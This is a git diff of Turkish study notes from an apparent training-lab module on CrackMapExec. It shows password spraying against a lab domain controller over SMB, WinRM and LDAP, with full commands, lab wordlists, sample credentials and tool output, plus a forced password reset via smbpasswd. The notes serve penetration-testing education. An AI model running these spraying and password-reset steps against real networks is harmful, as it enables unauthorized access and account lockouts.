@@ -1018,742 +1018,16338 @@ Bir sonraki bölümde, bu bilgileri kullanarak **kimlik bilgilerini nasıl tespi
 
 ### Password Spraying
 
-NULL Session açığını kötüye kullanan kullanıcıların bir listesini bulduk. Şimdi domain'de bir yer edinmek için geçerli bir şifre bulmamız gerekiyor. Elimizde uygun bir kullanıcı listesi yoksa veya hedef `NULL Session` saldırısına karşı savunmasız değilse, geçerli kullanıcı adlarını bulmak için OSINT (yani LinkedIn'de avlanma), geniş bir kullanıcı adı listesi ve Kerbrute ile brute-forcing, fiziksel keşif vb. gibi başka bir yola ihtiyacımız olacaktır. Bu bölümde, bir kullanıcı adı listesine sahip olduğumuzda bir dizi hedefe karşı kimlik doğrulamayı test ederek geçerli bir kimlik bilgisi kümesini nasıl bulacağımızı öğreneceğiz.
+NULL Session açığını kötüye kullanan kullanıcıların bir listesini bulduk. Şimdi domain'de bir yer edinmek için geçerli bir şifre bulmamız gerekiyor. Elimizde uygun bir kullanıcı listesi yoksa veya hedef `NULL Session` saldırısına karşı savunmasız değilse, geçerli kullanıcı adlarını bulmak için OSINT (yani `LinkedIn`'de avlanma), geniş bir kullanıcı adı listesi ve `Kerbrute` ile brute-forcing, fiziksel keşif vb. gibi başka bir yola ihtiyacımız olacaktır. Bu bölümde, bir kullanıcı adı listesine sahip olduğumuzda bir dizi hedefe karşı kimlik doğrulamayı test ederek geçerli bir kimlik bilgisi kümesini nasıl bulacağımızı öğreneceğiz.
 
 ### Creating a Password List
-Bu kullanıcıların şifrelerini bilmiyoruz, ancak bildiğimiz şey şifre politikasıdır. Welcome1 ve Password123 gibi yaygın parolalardan oluşan özel bir sözcük listesi, sonunda yıl olan geçerli ay, şirket adı veya domain adı oluşturabilir ve farklı mutasyonlar uygulayabiliriz. Parola mutasyonları hakkında daha fazla bilgi edinmek için Akademi modülü Parola Saldırıları'na göz atın. Parola olarak alan adını büyük harf, sayı ve sonunda ünlem işareti ile kullanalım:
+
+Bu kullanıcıların şifrelerini bilmiyoruz, ancak bildiğimiz şey şifre politikasıdır. `Welcome1` ve `Password123` gibi yaygın parolalardan oluşan özel bir sözcük listesi, sonunda yıl olan geçerli ay, şirket adı veya domain adı oluşturabilir ve farklı mutasyonlar uygulayabiliriz.  Parola olarak domain'in büyük harf, sayı ve sonunda ünlem işareti ile kullanalım:
 
 ### Password List & User List
-![Pasted image 20241201174311.png](/img/user/resimler/Pasted%20image%2020241201174311.png)
 
-![Pasted image 20241201174734.png](/img/user/resimler/Pasted%20image%2020241201174734.png)
-
-Not: Bu bölümdeki alıştırmaları tamamlamak için kullanıcı adı listesinin tamamını kullanmamız gerekecek
-
-Şimdi protokolü ve hedefi seçmemiz ve kullanıcı adı(ları) veya kullanıcı adlarını içeren dosya(lar) sağlamak için -u seçeneğini ve parola(lar) veya parolaları içeren dosya(lar) sağlamak için -p seçeneğini kullanmamız gerekir. SMB protokolünü kullanan bazı örnekler görelim:
-
-
-### Kullanıcı Adları ve Tek Bir Parola İçeren Bir Dosya ile Parola Saldırısı
-![Pasted image 20241201185226.png](/img/user/resimler/Pasted%20image%2020241201185226.png)
-![Pasted image 20241201185233.png](/img/user/resimler/Pasted%20image%2020241201185233.png)
+```
+cat passwords.txt
+Inlanefreight01!
+Inlanefreight02!
+Inlanefreight03!
+```
 
 
-### Kullanıcı Adları Listesi ve Tek Bir Parola ile Parola Saldırısı
-![Pasted image 20241201185309.png](/img/user/resimler/Pasted%20image%2020241201185309.png)
+```
+cat users.txt
+
+noemi
+david
+carlos
+grace
+peter
+robert
+administrator
+```
 
 
-### Kullanıcı Adı Listesi ve İki Parola ile Parola Saldırısı
-![Pasted image 20241201191750.png](/img/user/resimler/Pasted%20image%2020241201191750.png)
+Şimdi **protocol** ve **target** seçmemiz ve `-u` seçeneğini kullanarak **username(ler)** veya **username içeren dosya(lar)** sağlamamız, `-p` seçeneğini kullanarak ise **password(ler)** veya **password içeren dosya(lar)** belirtmemiz gerekiyor. **SMB** **protocol**'ünü kullanarak bazı örneklere bakalım:
 
-Çıktıdan da görebileceğimiz gibi, yeşil renkle temsil edilen ve [+] çıktısıyla başlayan domain'de yalnızca bir geçerli kimlik bilgisi bulduk. Bununla birlikte, tüm hesaplar test edilmemiştir. İlk geçerli kimlik bilgileri bulunduktan sonra, CME password spraying işlemini durdurur çünkü bu genellikle domain numaralandırmasının geri kalanı için yeterlidir. Bazen, ayrıcalıklı bir hesap bulabileceğimiz için tüm hesapları test etmek daha iyidir. Bu amaçla, CME -- continue-on-success seçeneği ile birlikte gelir:
+
+### Bir Dosya İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack
+
+```
+crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+```
+
+
+
+
+### Bir Liste İçeren Username'ler ile Tek Bir Password Kullanarak Password Attack
+
+```
+crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p
+Inlanefreight01!
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+```
+
+
+
+### Bir Liste İçeren Username'ler ile İki Password Kullanarak Password Attack
+
+```
+crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
+Inlanefreight01! Inlanefreight02!
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+```
+
+Çıktıdan da görebileceğimiz gibi, yeşil renkle temsil edilen ve `[+]` çıktısıyla başlayan domain'de yalnızca bir geçerli kimlik bilgisi bulduk. Bununla birlikte, tüm hesaplar test edilmemiştir. İlk geçerli kimlik bilgileri bulunduktan sonra, `CME` `password spraying` işlemini `durdurur` çünkü bu genellikle domain numaralandırmasının geri kalanı için yeterlidir. Bazen, ayrıcalıklı bir hesap bulabileceğimiz için tüm hesapları test etmek daha iyidir. Bu amaçla, CME `--continue-on-success` seçeneği ile birlikte gelir:
 
 
 ### Continue on Success
-![Pasted image 20241201192236.png](/img/user/resimler/Pasted%20image%2020241201192236.png)
 
-Ayrıca, her kullanıcı için tüm parolaları test edecek olan passwords.txt gibi bir dosya ile bir parola listesi sağlayabiliriz, bu parola püskürtme için yararlı olabilir, ancak bir Hesap Kilitleme ilkesi ayarlandığında çok fazla değil. Hesap Kilitleme konusunu bu bölümün ilerleyen kısımlarında ele alacağız.
+```
+crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p
+Inlanefreight01! Inlanefreight02! --continue-on-success
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\grace:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\carlos:Inlanefreight02!
+
+```
+
+Ayrıca, her kullanıcı için tüm parolaları test edecek olan passwords.txt gibi bir dosya ile bir parola listesi sağlayabiliriz, bu password spraying için yararlı olabilir, ancak bir Hesap Kilitleme politikası ayarlandığında çok fazla değil. Hesap Kilitleme konusunu bu bölümün ilerleyen kısımlarında ele alacağız.
 
 Hesap kilitlemenin 5 olarak ayarlandığını biliyorsak, bir hesabın kilitlenmesini önlemek için 2 veya 3 paroladan oluşan bir parola listesi oluşturabiliriz.
 
 
-### Kullanıcı Adı Listesi ve Parola Listesi ile Parola Saldırısı
-![Pasted image 20241201193230.png](/img/user/resimler/Pasted%20image%2020241201193230.png)![Pasted image 20241201193238.png](/img/user/resimler/Pasted%20image%2020241201193238.png)
+### Bir Liste İçeren Username'ler ile Bir Password List Kullanarak Password Attack
+
+```
+crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\noemi:Inlanefreight03! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight02! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\david:Inlanefreight03! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\carlos:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\carlos:Inlanefreight02!
+```
 
 
-### Bir Kullanıcı İçin Bir Parolanın Eşit Olup Olmadığını Kontrol Etme Kelime Listesi
-CME'nin bir başka harika özelliği de, her kullanıcının parolasını biliyorsak ve hala geçerli olup olmadıklarını test etmek istiyorsak. Bunun için --no-bruteforce seçeneğini kullanın. Bu seçenek 1. kullanıcıyı 1. parola ile, 2. kullanıcıyı 2. parola ile ve bu şekilde kullanacaktır.
+### Bir User ile Bir Password'ün Eşleşmesini Bir Wordlist Kullanarak Kontrol Etme
 
+CME'nin bir başka harika özelliği de, her kullanıcının parolasını biliyorsak ve hala geçerli olup olmadıklarını test etmek istiyorsak. Bunun için `--no-bruteforce` seçeneğini kullanın. Bu seçenek 1. kullanıcıyı 1. parola ile, 2. kullanıcıyı 2. parola ile ve bu şekilde kullanacaktır.
 
-### Disable Bruteforcing
-![Pasted image 20241201193623.png](/img/user/resimler/Pasted%20image%2020241201193623.png)
+### Bruteforcing Devre dışı bırak
 
-![Pasted image 20241201193717.png](/img/user/resimler/Pasted%20image%2020241201193717.png)
+```
+cat userfound.txt
+grace
+carlos
+```
 
-![Pasted image 20241201193844.png](/img/user/resimler/Pasted%20image%2020241201193844.png)
+```
+cat passfound.txt
+Inlanefreight01!
+Inlanefreight02!
+```
+
+```
+crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\carlos:Inlanefreight02!
+```
 
 
 ### Testing Local Accounts
 
-Domain hesabı yerine bir lokal hesabı test etmek istersek, CrackMapExec'te -- local-auth seçeneğini kullanabiliriz:
+Domain hesabı yerine bir `lokal` hesabı test etmek istersek, CrackMapExec'te                  `--local-auth` seçeneğini kullanabiliriz:
 
 ### Lokal Hesap Nedir?
 
-- **Lokal hesap**, bir bilgisayara **yalnızca o bilgisayarda** bulunan kullanıcı hesabıdır. Bu hesap, bir **domain** (etki alanı) yönetimi altında değildir.
-- Örneğin, bir Windows bilgisayarda "Administrator" veya başka bir yerel kullanıcı hesabı, **lokal hesap**tır.
+- **Lokal hesap**, bir bilgisayara **yalnızca o bilgisayarda** bulunan kullanıcı hesabıdır. Bu hesap, bir **domain**  yönetimi altında değildir.
+- Örneğin, bir Windows bilgisayarda "`Administrator`" veya başka bir local kullanıcı hesabı, **lokal hesap**tır.
 - Bu hesaplar, sadece o makinede geçerli kullanıcı adı ve şifreye sahiptir.
 
-**Domain hesabı** ise bir **Active Directory (AD)** ortamında tanımlanmış kullanıcı hesabıdır ve etki alanındaki herhangi bir bilgisayarda kullanılabilir.
+**Domain hesabı** ise bir **Active Directory (AD)** ortamında tanımlanmış kullanıcı hesabıdır ve domaindeki herhangi bir bilgisayarda kullanılabilir.
 
 
 ### Password Spraying Local Accounts
-![Pasted image 20241201194034.png](/img/user/resimler/Pasted%20image%2020241201194034.png)
 
-Not: Domain Controller'ların lokal bir hesap veritabanı yoktur, bu yüzden bir Domain Controller'a karşı -- local-auth bayrağını kullanamayız.
+```
+crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --localauth
+
+SMB 192.168.133.157 445 WIN10 [*] Windows 10.0
+Build 22000 x64 (name:WIN10) (domain:WIN10) (signing:False) (SMBv1:True)
+SMB 192.168.133.157 445 WIN10 [+]
+WIN10\Administrator:Password@123
+
+```
+
+Not: Domain Controller'ların lokal bir hesap veritabanı yoktur, bu yüzden bir Domain Controller'a karşı `--local-auth` bayrağını kullanamayız.
 
 
-### Hesap Kilitleme
+###  Account Lockout Hesap Kilitleme
 
-Password Spraying işlemini gerçekleştirirken dikkatli olun. Değerden emin olmamız gerekiyor: Hesap Kilitleme Eşiği Yok olarak ayarlanmıştır. Bir değer varsa (genellikle 5), her hesapta denediğimiz deneme sayısına dikkat edin ve sayacın 0'a sıfırlandığı pencereyi (genellikle 30 dakika) gözlemleyin. Aksi takdirde, domain'deki tüm hesapları 30 dakika veya daha uzun süre kilitleme riski vardır (bunun ne kadar olduğunu öğrenmek için Kilitli Hesap Süresi'ni kontrol edin). Bazen bir domain parola politikası, bir yöneticinin hesapların kilidini manuel olarak açmasını gerektirecek şekilde ayarlanır ve bu da dikkatsiz Parola Püskürtme ile bir veya daha fazla hesabı kilitlediğimizde daha da büyük bir sorun yaratabilir. Zaten bir kullanıcı hesabınız varsa, kullanıcının yanlış bir parola kullanarak hesapta oturum açmayı kaç kez denediğini ölçen Bad-Pwd-Count özniteliğini sorgulayabilirsiniz.
+**Password Spraying** gerçekleştirirken dikkatli olun. **Account Lockout Threshold** değerinin **None** olarak ayarlandığından emin olmamız gerekiyor. Eğer bir değer varsa (genellikle **5**), her **account** için deneme sayısına dikkat etmeli ve sayacın **0**'a sıfırlandığı zamanı gözlemlemeliyiz (genellikle **30 dakika**). Aksi takdirde, tüm **account**'ları **30 dakika veya daha uzun süre** kilitleme riski oluşur (**Locked Account Duration** değerini kontrol ederek sürenin ne kadar olduğunu öğrenebilirsiniz). Bazen **domain password policy**, bir **administrator**'ün **account**'ları manuel olarak açmasını gerektirecek şekilde yapılandırılmış olabilir. Bu durumda dikkatsiz yapılan **Password Spraying**, bir veya daha fazla **account**'ı kilitleyerek daha büyük bir sorun yaratabilir. Eğer zaten bir **user account**'ınız varsa, **Bad-Pwd-Count** attribute'u sorgulayabilirsiniz. Bu attribute, **user**'ın yanlış bir **password** kullanarak **account**'a giriş yapmayı kaç kez denediğini gösterir.
 
 
-### Query Bad Password Count
-![Pasted image 20241201194518.png](/img/user/resimler/Pasted%20image%2020241201194518.png)
-![Pasted image 20241201194803.png](/img/user/resimler/Pasted%20image%2020241201194803.png)
+### **Bad Password Count** Sorgulama
 
+```
+crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+] Enumerated domain
+user(s)
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\alina badpwdcount: 0 desc:
+SMB 10.129.203.121 445 DC01 
+inlanefreight.htb\peter badpwdcount: 2 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\grace badpwdcount: 0 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\robert badpwdcount: 3 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\carlos badpwdcount: 1 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\svc_workstations badpwdcount: 0 desc:
+SMB 10.129.203.121 445 DC01 inlanefreight.htb\john
+badpwdcount: 0 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\david badpwdcount: 4 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\julio badpwdcount: 3 desc:
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\krbtgt badpwdcount: 0 desc: Key
+Distribution Center Service Account
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Guest badpwdcount: 0 desc:
+Built-in account for guest access to the computer/domain
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Administrator badpwdcount: 0 desc:
+Built-in account for administering the computer/domain 
+```
 
 Bu bilgilerle, parola saldırıları için daha iyi bir strateji oluşturabilirsiniz.
-Not: Kullanıcı doğru kimlik bilgileriyle kimlik doğrulaması yaparsa Hatalı Parola Sayısı sıfırlanır.
 
+Not: Kullanıcı doğru kimlik bilgileriyle kimlik doğrulaması yaparsa `Bad Password Count`  sıfırlanır.
 
+Burada kaldım 
 ### Account Status
 
 Bir hesabı test ettiğimizde, CME'nin görüntüleyebileceği üç renk vardır:
 
-![Pasted image 20241201195348.png](/img/user/resimler/Pasted%20image%2020241201195348.png)
+| Renk    | Açıklama                                                               |
+| ------- | ---------------------------------------------------------------------- |
+| Yeşil   | Kullanıcı adı ve şifre geçerli.                                        |
+| Kırmızı | Kullanıcı adı veya şifre geçersiz.                                     |
+| Magenta | Kullanıcı adı ve şifre geçerli, ancak kimlik doğrulama başarılı değil. |
 
 Parola hala geçerliyken çeşitli nedenlerle kimlik doğrulama başarısız olabilir. İşte tam bir liste:
 
-![Pasted image 20241201195434.png](/img/user/resimler/Pasted%20image%2020241201195434.png)
+| Durum Kodu                    | Açıklama                         |
+| ----------------------------- | -------------------------------- |
+| STATUS_ACCOUNT_DISABLED       | Hesap devre dışı bırakılmış.     |
+| STATUS_ACCOUNT_EXPIRED        | Hesap süresi dolmuş.             |
+| STATUS_ACCOUNT_RESTRICTION    | Hesap kısıtlamalı.               |
+| STATUS_INVALID_LOGON_HOURS    | Geçersiz oturum açma saatleri.   |
+| STATUS_INVALID_WORKSTATION    | Geçersiz workstation.            |
+| STATUS_LOGON_TYPE_NOT_GRANTED | Oturum açma türü verilmemiş.     |
+| STATUS_PASSWORD_EXPIRED       | Şifre süresi dolmuş.             |
+| STATUS_PASSWORD_MUST_CHANGE   | Şifrenin değiştirilmesi gerekli. |
+| STATUS_ACCESS_DENIED          | Erişim reddedildi.               |
 
-Nedenine bağlı olarak, örneğin, STATUS_INVALID_LOGON_HOURS veya STATUS_INVALID_WORKSTATION başka bir workstation veya başka bir zaman denemek için iyi bir fikir olabilir. STATUS_PASSWORD_MUST_CHANGE mesajı durumunda, Impacket smbpasswd kullanarak kullanıcının şifresini şu şekilde değiştirebiliriz: smbpasswd -r domain -U user .
+Nedenine bağlı olarak, örneğin, `STATUS_INVALID_LOGON_HOURS` veya `STATUS_INVALID_WORKSTATION` başka bir workstation veya başka bir zaman denemek için iyi bir fikir olabilir. `STATUS_PASSWORD_MUST_CHANGE` mesajı durumunda, [Impacket smbpasswd](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbpasswd.py) kullanarak kullanıcının şifresini şu şekilde değiştirebiliriz: `smbpasswd -r domain -U user` .
 
 
-### Durumu PASSWORD_MUST_CHANGE Olan Bir Hesabın Parolasını Değiştirme
-![Pasted image 20241201195605.png](/img/user/resimler/Pasted%20image%2020241201195605.png)
+### Şifre Değiştirme: PASSWORD_MUST_CHANGE Durumundaki Hesap için
 
-Burada hedef kullanıcının parolasını değiştirebiliriz. Bir sızma testi sırasında, hesap şifrelerini değiştirirken dikkatli olmak ve her zaman rapor eklerimizde hesap değişikliklerini not etmek isteriz. Hedef hesap uzun süredir oturum açmadıysa, parolayı değiştirmek, aktif olarak kullanılan bir hesaba göre muhtemelen daha güvenlidir. Genellikle bir kuruluş kullanılmayan hesapları devre dışı bırakır, ancak zaman zaman değerlendirme hedefimize doğru ilerlemek için şifrelerini değiştirebileceğimiz unutulmuş hesaplarla karşılaşırız. Şüpheniz varsa, herhangi bir değişiklik yapmadan önce her zaman müşteriye danışın.
+```
+crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!
 
-![Pasted image 20241201200048.png](/img/user/resimler/Pasted%20image%2020241201200048.png)
-![Pasted image 20241201200057.png](/img/user/resimler/Pasted%20image%2020241201200057.png)
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE
+SMB 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
+```
+
+Burada hedef kullanıcının şifresini değiştirebiliriz. Bir penetrasyon testinde, hesap şifrelerini değiştirme konusunda dikkatli olmalı ve yapılan her türlü hesap değişikliğini raporumuzun eklerinde not etmeliyiz. Hedef hesap uzun süredir giriş yapmamışsa, aktif olarak kullanılan bir hesaba göre şifreyi değiştirmek genellikle daha güvenlidir. Tipik olarak, bir organizasyon kullanılmayan hesapları devre dışı bırakır, ancak zaman zaman şifrelerini değiştirebileceğimiz unutulmuş hesaplarla karşılaşabiliriz ve bu, değerlendirme hedefimize daha da yaklaşmamıza yardımcı olabilir. Şüphe durumunda, her zaman herhangi bir değişiklik yapmadan önce müşteriyle iletişime geçin.
+
+```
+smbpasswd -r 10.129.203.121 -U peter
+
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user peter
+```
 
 Artık yeni parola ile kimlik doğrulaması yapabiliriz.
 
-![Pasted image 20241201200121.png](/img/user/resimler/Pasted%20image%2020241201200121.png)
+```
+crackmapexec smb 10.129.203.121 -u peter -p Password123
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\peter:Password123
+
+```
 
 
 ### Target Protocol WinRM
 
-Varsayılan olarak, esasen Remote Management (uzaktan yönetim) için tasarlanmış olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef üzerinde PowerShell komutlarını çalıştırmamıza izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 üzerinde TCP/5985 (HTTP) ve TCP/5986 (HTTPS) portlarında varsayılan olarak etkindir. PowerShell Remoting, [Yönetim için Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolünün Microsoft uygulaması olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)ı (WinRM) kullanır
+Varsayılan olarak, esasen Remote Management (uzaktan yönetim) için tasarlanmış olan[ Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) servisi, bir hedef üzerinde PowerShell komutlarını çalıştırmamıza izin verir. WinRM, Windows Server 2012 R2 / 2016 / 2019 üzerinde `TCP/5985 (HTTP)` ve `TCP/5986 (HTTPS`) portlarında varsayılan olarak etkindir. PowerShell Remoting, [Yönetim için Web Hizmetleri (WSManagement)](https://www.dmtf.org/sites/default/files/standards/documents/DSP0226_1.2.0.pdf) protokolünün Microsoft uygulaması olan [Windows Remote Management'](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)ı (WinRM) kullanır
 
-Remote bir bilgisayardaki WinRM servisine bağlanmak için local administrator ayrıcalıklarına sahip olmamız, Remote Management Users grubunun bir üyesi olmamız veya oturum yapılandırmasında PowerShell Remoting için açık izinlere sahip olmamız gerekir.
+Bir remote bilgisayarda WinRM servisine bağlanmak için, `local administrator` ayrıcalıklarına sahip olmamız, `Remote Management Users` grubunun bir üyesi olmamız veya oturum yapılandırmasında `PowerShell Remoting` için açık izinlere sahip olmamız gerekir.
 
-WinRM, bir parolanın geçerli olup olmadığını belirlemek için en iyi protokol değildir, çünkü yalnızca WinRM'ye erişimi varsa hesabın geçerli olduğunu gösterecektir. Bu senaryoda, bulduğumuz üç (3) hesabı test edebilir ve bu üç (3) hesaptan herhangi birinin WinRM'ye erişimi olup olmadığını görmek için --no-bruteforce seçeneğini kullanabiliriz.
+WinRM, bir parolanın geçerli olup olmadığını belirlemek için en iyi protokol değildir çünkü sadece WinRM erişimi varsa hesabın geçerli olduğunu belirtir. Bu senaryoda, bulduğumuz üç (3) hesabı test edebiliriz ve bu üç (3) hesaptan herhangi birinin WinRM erişimi olup olmadığını görmek için `--no-bruteforce` seçeneğini kullanabiliriz.
 
 
 ### WinRM - Password Spraying
-![Pasted image 20241201200742.png](/img/user/resimler/Pasted%20image%2020241201200742.png)
-![Pasted image 20241201200747.png](/img/user/resimler/Pasted%20image%2020241201200747.png)
 
-![Pasted image 20241201200803.png](/img/user/resimler/Pasted%20image%2020241201200803.png)
+```
+crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success
 
-Winrm ile daha yüksek yetki edebiliriz.
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\grace:Inlanefreight01!
+SMB 10.129.203.121 445 DC01 [+]
+inlanefreight.htb\robert:Inlanefreight01! SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\peter:Password123
+```
 
-Local admin haklarına sahip olan Peter hesabı ile sistem üzerinde komut çalıştırabiliriz. Komut Yürütme bölümünde bu konu hakkında daha fazla bilgi vereceğiz.
+```
+crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --nobruteforce --continue-on-success
+
+SMB 10.129.203.121 5985 DC01 [*] Windows 10.0 Build
+17763 (name:DC01) (domain:inlanefreight.htb)
+HTTP 10.129.203.121 5985 DC01 [*]
+http://10.129.203.121:5985/wsman
+WINRM 10.129.203.121 5985 DC01 [-]
+inlanefreight.htb\grace:Inlanefreight01!
+WINRM 10.129.203.121 5985 DC01 [-]
+inlanefreight.htb\robert:Inlanefreight01!
+WINRM 10.129.203.121 5985 DC01 [+]
+inlanefreight.htb\peter:Password123 (Pwn3d!)
+```
+
+Peter adlı hesabı ile sistemde komutlar çalıştırabiliriz, çünkü bu hesap Local administrator haklarına sahiptir. Bununla ilgili daha fazla bilgiyi `Command Execution` bölümünde ele alacağız.
 
 
 ### LDAP - Password Spraying 
 
-LDAP protokolüne karşı Password Spraying yaparken FQDN kullanmamız gerekir, aksi takdirde hata alırız:
-
+LDAP protokolüne karşı Password Spraying yaparken `FQDN` kullanmamız gerekir, aksi takdirde hata alırız:
 
 ### IP kullanılırken hata oluştu
-![Pasted image 20241201201243.png](/img/user/resimler/Pasted%20image%2020241201201243.png)
+
+```
+crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+LDAP 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\julio:Inlanefreight01! Error connecting to the domain,
+are you sure LDAP service is running on the target ?
+LDAP 10.129.203.121 445 DC01 [-]
+inlanefreight.htb\grace:Inlanefreight01! Error connecting to the domain,
+are you sure LDAP service is running on the target ?
+
+```
 
 Bu sorunu çözmek için iki seçeneğimiz var: saldırı hostumuzu domain name server (DNS) kullanacak şekilde yapılandırmak veya KDC FQDN'sini /etc/hosts dosyamızda yapılandırmak. İkinci seçeneği seçelim ve FQDN'yi /etc/hosts dosyamıza ekleyelim:
 
 
-### FQDN'nin hosts dosyasına eklenmesi ve Parola Püskürtme İşleminin Gerçekleştirilmesi
